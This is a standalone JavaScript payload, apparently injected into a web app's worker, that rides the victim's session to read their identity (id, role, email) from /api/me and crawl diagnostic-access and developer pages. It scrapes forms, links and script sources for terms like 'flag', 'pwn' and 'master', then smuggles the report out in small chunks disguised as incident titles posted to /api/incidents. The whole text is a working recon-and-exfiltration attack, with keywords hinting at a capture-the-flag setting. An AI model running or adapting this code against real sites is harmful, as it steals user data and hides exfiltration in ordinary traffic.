
(async () => {
    const get = async path => {
        const r = await fetch(path, { credentials: "same-origin" });
        return { status: r.status, text: await r.text() };
    };

    const meResponse = await get("/api/me");
    let me;
    try { me = JSON.parse(meResponse.text).user; } catch {}

    const report = {
        identity: me ? {
            id: me.id,
            role: me.role,
            verified: me.verified,
            email: me.email
        } : meResponse,
        pages: [],
        sources: []
    };

    const paths = [
        "/diagnostic-access/requests",
        "/diagnostic-access/requests/6",
        "/diagnostic-access/requests/new",
        "/diagnostic-access/profiles",
        "/diagnostic-access/profiles/6/edit",
        "/diagnostic-access/profiles/new",
        "/developer"
    ];

    const assets = new Set([
        "/js/api-client.js",
        "/js/app.js",
        "/js/link-analyzer.js",
        "/js/link-analyzer-worker.js"
    ]);

    for (const path of paths) {
        const { status, text: html } = await get(path);

        const title = html.match(/<title[^>]*>(.*?)<\/title>/i)?.[1];

        const links = [...html.matchAll(
            /href=["']([^"']+)["']/gi
        )].map(m => m[1]);

        const scripts = [...html.matchAll(
            /<script[^>]+src=["']([^"']+)["']/gi
        )].map(m => m[1]);

        scripts.forEach(s => {
            if (s.startsWith("/")) assets.add(s);
        });

        const forms = [...html.matchAll(
            /<form\b[\s\S]*?<\/form>/gi
        )].map(m => m[0].replace(/\s+/g, " ").slice(0, 1000));

        report.pages.push({
            path,
            status,
            title,
            links: links.filter(x =>
                /diagnostic|log|access|developer|monitor/i.test(x)
            ),
            forms
        });
    }

    for (const src of assets) {
        try {
            const { status, text: js } = await get(src);

            const matches = js.split("\n")
                .map((line, i) => `${i + 1}: ${line.trim()}`)
                .filter(line =>
                    /diagnostic|log|audit|support|bundle|master|pwn|flag|api\//i.test(line)
                )
                .slice(0, 35);

            report.sources.push({ src, status, matches });
        } catch (e) {
            report.sources.push({ src, error: String(e) });
        }
    }

    const output = JSON.stringify(report, null, 2).slice(0, 6500);

    for (let i = 0; i < output.length; i += 80) {
        const title =
            `MMINFO-${String(i / 80 + 1).padStart(3, "0")}:` +
            output.slice(i, i + 80);

        await fetch("/api/incidents", {
            method: "POST",
            credentials: "same-origin",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                title,
                facility: "Meridian-2",
                severity: "Watch"
            })
        });
    }

    self.postMessage({
        type: "progress",
        message: "MASTER MIND RECON COMPLETE"
    });
})();
